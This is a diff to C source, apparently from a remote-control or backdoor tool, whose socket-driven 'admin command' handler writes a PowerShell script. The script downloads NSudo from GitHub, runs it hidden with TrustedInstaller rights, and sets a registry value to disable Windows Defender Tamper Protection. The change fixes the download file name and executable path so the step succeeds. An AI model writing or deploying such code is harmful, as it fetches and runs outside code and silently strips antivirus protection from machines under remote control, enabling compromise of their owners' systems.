@@ -207,14 +207,14 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         if (f) {
             fprintf(f, "$zip = Join-Path $env:TEMP 'NSudo.zip'\n");
             fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
-            fprintf(f, "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All.zip' -OutFile $zip\n");
+            fprintf(f, "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -OutFile $zip\n");
             fprintf(f, "Expand-Archive -Path $zip -DestinationPath $out -Force\n");
-            fprintf(f, "$exe = Join-Path $out 'x64\\NSudo.exe'\n");
+            fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLG.exe'\n");
             fprintf(f, "if (Test-Path $exe) {\n");
             fprintf(f, "    Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait\n");
             fprintf(f, "    Write-Host 'Tamper Protection disabled'\n");
             fprintf(f, "} else {\n");
-            fprintf(f, "    Write-Host 'NSudo.exe not found after extraction'\n");
+            fprintf(f, "    Write-Host 'NSudoLG.exe not found after extraction'\n");
             fprintf(f, "}\n");
             fclose(f);
             
